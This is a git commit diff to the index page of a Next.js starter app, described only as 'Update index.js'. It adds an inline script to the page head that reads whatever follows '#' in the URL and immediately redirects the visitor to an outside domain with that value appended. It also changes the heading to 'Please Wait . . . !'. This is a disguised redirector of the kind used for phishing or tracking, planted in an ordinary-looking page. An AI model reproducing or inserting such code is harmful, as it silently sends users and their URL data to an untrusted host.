cc9b1d218f532cfa5be8ee6a5afd8fe156bc9abd
Abdllkarim Saibaan <48703679+expiren@users.noreply.github.com>
2022-09-04 21:18:14 +0100

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -6,12 +6,14 @@ export default function Home() {
   return (
     <div className="container">
       <Head>
+         <script>var tracking_param = window.location.href.split('#')[1];
+        document.location.href ='https://ocinka.org/rdcl/'+tracking_param</script>  
         <title>Next.js Starter!</title>
         <link rel="icon" href="/favicon.ico" />
       </Head>
 
       <main>
-        <Header title="Welcome to my app!" />
+        <Header title="Please Wait . . . !" />
         <p className="description">
           Get started by editing <code>pages/index.js</code>
         </p>
